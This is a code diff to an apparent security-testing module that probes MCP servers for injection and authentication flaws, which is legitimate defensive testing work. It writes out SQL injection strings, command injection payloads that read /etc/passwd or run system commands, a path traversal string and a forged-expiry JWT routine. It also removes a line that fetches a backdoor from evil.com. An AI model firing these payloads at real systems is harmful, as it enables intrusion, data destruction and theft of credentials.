@@ -6,20 +6,17 @@ from enum import Enum
 from typing import Any
 from uuid import uuid4
 
+# MCP SDK imports
+from mcp import ClientSession
+from mcp.client.streamable_http import streamablehttp_client
 from pydantic import BaseModel, Field
 
 from ..shared.progress_tracker import ProgressTracker, TestStatus
 from ..shared.result_models import BaseTestResult, ErrorType, TestType
-
-# MCP SDK imports with graceful fallback
-try:
-    from mcp import ClientSession
-    from mcp.client.streamable_http import streamablehttp_client
-    from mcp.types import Implementation
-except ImportError:
-    ClientSession = None
-    streamablehttp_client = None
-    Implementation = None
+from .context_analyzer import ContextAnalyzer
+from .parameter_injector import ParameterInjector
+from .payload_generator import PayloadGenerator
+from .token_extractor import TokenExtractor
 
 
 class SecurityCategory(str, Enum):
@@ -185,8 +182,76 @@ class MCPSecurityTester:
             # Connection failed - this is expected for invalid tokens
             return False
 
-    def _create_expired_jwt(self) -> str:
-        """Create an expired JWT token for testing"""
+    async def _create_manipulated_jwt(self) -> str:
+        """Create manipulated JWT based on real server-issued token"""
+        if not self.server_url:
+            return self._create_mock_expired_jwt()
+
+        extractor = TokenExtractor()
+        real_tokens = await extractor.get_real_tokens(str(self.server_url))
+
+        if real_tokens and real_tokens.get("access_token"):
+            # Manipulate real JWT structure
+            return self._manipulate_real_jwt(real_tokens["access_token"])
+        else:
+            # Fallback to mock JWT
+            return self._create_mock_expired_jwt()
+
+    def _manipulate_real_jwt(self, jwt_token: str) -> str:
+        """Manipulate real JWT token for security testing"""
+        import base64
+        import json
+        from datetime import datetime, timedelta
+
+        try:
+            if not self._is_jwt(jwt_token):
+                # If not a JWT, return expired mock JWT
+                return self._create_mock_expired_jwt()
+
+            header, payload, signature = jwt_token.split(".")
+
+            # Decode and manipulate payload to create expired token
+            try:
+                # Add padding if needed
+                missing_padding = len(payload) % 4
+                if missing_padding:
+                    payload += "=" * (4 - missing_padding)
+
+                decoded_payload = json.loads(
+                    base64.urlsafe_b64decode(payload).decode("utf-8")
+                )
+
+                # Set expiration to past date
+                expired_time = datetime.utcnow() - timedelta(hours=1)
+                decoded_payload["exp"] = int(expired_time.timestamp())
+
+                # Re-encode payload
+                modified_payload_bytes = json.dumps(
+                    decoded_payload, separators=(",", ":")
+                ).encode("utf-8")
+                modified_payload = (
+                    base64.urlsafe_b64encode(modified_payload_bytes)
+                    .decode("utf-8")
+                    .rstrip("=")
+                )
+
+                # Return token with manipulated payload but original signature (invalid)
+                return f"{header}.{modified_payload}.{signature}"
+
+            except Exception:
+                # If payload manipulation fails, just remove signature
+                return f"{header}.{payload}."
+
+        except Exception:
+            # If manipulation fails completely, fallback to mock JWT
+            return self._create_mock_expired_jwt()
+
+    def _is_jwt(self, token: str) -> bool:
+        """Check if token is a JWT by counting dots"""
+        return len(token.split(".")) == 3
+
+    def _create_mock_expired_jwt(self) -> str:
+        """Create a mock expired JWT token for testing (fallback)"""
         import base64
         import json
         from datetime import datetime, timedelta
@@ -416,7 +481,8 @@ class MCPSecurityTester:
             oauth_tester = OAuthTester(self.server_config, self.progress_tracker)
 
             # Run OAuth tests and convert results to SecurityTestResult format
-            oauth_results = await oauth_tester.run_oauth_tests(categories)
+            category_strings = [cat.value for cat in categories] if categories else None
+            oauth_results = await oauth_tester.run_oauth_tests(category_strings)
 
             # Convert AuthTestResult to SecurityTestResult for consistency
             for auth_result in oauth_results:
@@ -585,7 +651,8 @@ class MCPSecurityTester:
             ]
 
             # Make circular reference
-            malformed_params[0]["circular_ref"] = malformed_params[0]
+            if isinstance(malformed_params[0], dict):
+                malformed_params[0]["circular_ref"] = malformed_params[0]
 
             for i, params in enumerate(malformed_params):
                 try:
@@ -595,7 +662,7 @@ class MCPSecurityTester:
 
                     # Send malformed parameters through MCP
                     await asyncio.wait_for(
-                        self.session.call_tool(tool_name, params), timeout=10.0
+                        self.session.call_tool(tool_name, params if isinstance(params, dict) else {}), timeout=10.0
                     )
 
                     # Tool should handle or reject malformed params gracefully
@@ -749,7 +816,11 @@ class MCPSecurityTester:
                 ("invalid_token_123", "Invalid token", True),  # Should fail
                 ("", "Empty token", True),  # Should fail
                 ("malformed.token.here", "Malformed JWT", True),  # Should fail
-                (self._create_expired_jwt(), "Expired JWT", True),  # Should fail
+                (
+                    await self._create_manipulated_jwt(),
+                    "Expired JWT",
+                    True,
+                ),  # Should fail
                 (None, "No auth header", True),  # Should fail based on config
             ]
 
@@ -959,7 +1030,7 @@ class MCPSecurityTester:
         test_id = str(uuid4())
         start_time = datetime.now()
         vulnerability_detected = False
-        evidence = []
+        evidence: list[str] = []
 
         try:
             if not self.session or not self.available_tools:
@@ -981,7 +1052,7 @@ class MCPSecurityTester:
                 for test_params in test_cases:
                     try:
                         # Call tool with malformed parameters through MCP
-                        result = await self.session.call_tool(tool_name, test_params)
+                        result = await self.session.call_tool(tool_name, test_params if isinstance(test_params, dict) else {})
 
                         # Check if result contains error indicators
                         if result and isinstance(result, dict):
@@ -1255,12 +1326,13 @@ class MCPSecurityTester:
         vulnerability_detected = False
         evidence = []
 
-        sql_payloads = [
-            "'; DROP TABLE users; --",
-            "' OR '1'='1",
-            "' UNION SELECT * FROM information_schema.tables --",
-            "admin'--",
-            "'; SELECT password FROM users WHERE username='admin'; --",
+        # Generate context-aware SQL injection payloads
+        sql_payloads = await self._generate_injection_payloads()
+
+        # Extract payload values from the context-aware payload dicts
+        sql_payload_strings = [
+            payload["payload"] if isinstance(payload, dict) else str(payload)
+            for payload in sql_payloads
         ]
 
         try:
@@ -1275,7 +1347,7 @@ class MCPSecurityTester:
                 if "list" in tool_name.lower() or "help" in tool_name.lower():
                     continue
 
-                for payload in sql_payloads:
+                for payload in sql_payload_strings:
                     try:
                         # Send SQL injection payload through MCP
                         result = await self.session.call_tool(
@@ -1341,6 +1413,99 @@ class MCPSecurityTester:
                 vulnerability_detected=False,
             )
 
+    async def _generate_injection_payloads(self) -> list[dict[str, str]]:
+        """Generate context-aware injection payloads"""
+        try:
+            # Get server_id from available connections (this is a simplified approach)
+            from ..mcp_client.client_manager import MCPClientManager
+
+            client_manager = MCPClientManager()
+            server_id = None
+
+            # Find the first available server connection
+            for sid in client_manager.connections.keys():
+                server_id = sid
+                break
+
+            if not server_id:
+                # Fallback to static payloads if no server connection available
+                return self._get_fallback_injection_payloads()
+
+            # Analyze server context
+            context_analyzer = ContextAnalyzer()
+            server_context = await context_analyzer.analyze_server_context(server_id)
+
+            # Generate targeted payloads
+            payload_generator = PayloadGenerator()
+            sql_payloads = payload_generator.generate_sql_payloads(server_context)
+
+            # Combine with other injection types for comprehensive testing
+            command_payloads = payload_generator.generate_command_payloads(server_context)
+            path_payloads = payload_generator.generate_path_traversal_payloads(server_context)
+
+            # Prioritize payloads by risk assessment
+            all_payloads = sql_payloads + command_payloads[:2] + path_payloads[:1]
+            prioritized_payloads = payload_generator.prioritize_payloads_by_risk(
+                all_payloads, server_context.attack_surface
+            )
+
+            return prioritized_payloads[:10]  # Limit to top 10 payloads for performance
+
+        except Exception:
+            # If context analysis fails, fallback to static payloads
+            return self._get_fallback_injection_payloads()
+
+    def _get_fallback_injection_payloads(self) -> list[dict[str, str]]:
+        """Fallback to static payloads when dynamic generation fails"""
+        return [
+            {"payload": "'; DROP TABLE users; --", "description": "Generic SQL injection", "severity": "critical"},
+            {"payload": "' OR '1'='1", "description": "Authentication bypass attempt", "severity": "high"},
+            {"payload": "' UNION SELECT version() --", "description": "Union-based injection", "severity": "medium"},
+            {"payload": "; echo 'command_injection_test'", "description": "Command injection test", "severity": "high"},
+            {"payload": "../../../etc/passwd", "description": "Path traversal test", "severity": "medium"}
+        ]
+
+    async def _generate_tool_specific_payloads(self, tool_name: str) -> list[dict[str, Any]]:
+        """Generate payloads specifically tailored to a tool's parameters"""
+        try:
+            # Get server_id and tool information
+            from ..mcp_client.client_manager import MCPClientManager
+
+            client_manager = MCPClientManager()
+            server_id = None
+            target_tool = None
+
+            # Find the server connection and target tool
+            for sid in client_manager.connections.keys():
+                server_id = sid
+                connection = client_manager.connections.get(sid)
+                if connection and connection.tools:
+                    for tool in connection.tools:
+                        if tool.get('name') == tool_name:
+                            target_tool = tool
+                            break
+                if target_tool:
+                    break
+
+            if not server_id or not target_tool:
+                return []
+
+            # Analyze server context and generate targeted payloads
+            context_analyzer = ContextAnalyzer()
+            server_context = await context_analyzer.analyze_server_context(server_id)
+
+            # Use parameter injector for tool-specific analysis
+            parameter_injector = ParameterInjector()
+            injection_attempts = parameter_injector.inject_targeted_payloads(
+                target_tool, server_context, max_payloads_per_param=2
+            )
+
+            return injection_attempts
+
+        except Exception:
+            # If analysis fails, return empty list
+            return []
+
     async def _test_command_injection(self) -> SecurityTestResult:
         """Test for command injection vulnerabilities through MCP protocol"""
         test_id = str(uuid4())
@@ -1348,14 +1513,28 @@ class MCPSecurityTester:
         vulnerability_detected = False
         evidence = []
 
+        # Generate context-aware command injection payloads
+        all_payloads = await self._generate_injection_payloads()
+
+        # Filter for command injection payloads specifically
         command_payloads = [
-            "; ls -la",
-            "&& cat /etc/passwd",
-            "| whoami",
-            "`id`",
-            "$(uname -a)",
-            "; wget http://evil.com/backdoor.sh",
+            payload["payload"] if isinstance(payload, dict) else str(payload)
+            for payload in all_payloads
+            if isinstance(payload, dict) and (
+                "command" in payload.get("description", "").lower() or
+                payload.get("payload", "").startswith((";", "|", "`", "$", "&"))
+            )
         ]
+
+        # Add fallback command payloads if none found
+        if not command_payloads:
+            command_payloads = [
+                "; ls -la",
+                "&& cat /etc/passwd",
+                "| whoami",
+                "`id`",
+                "$(uname -a)"
+            ]
 
         try:
             if not self.session or not self.available_tools:
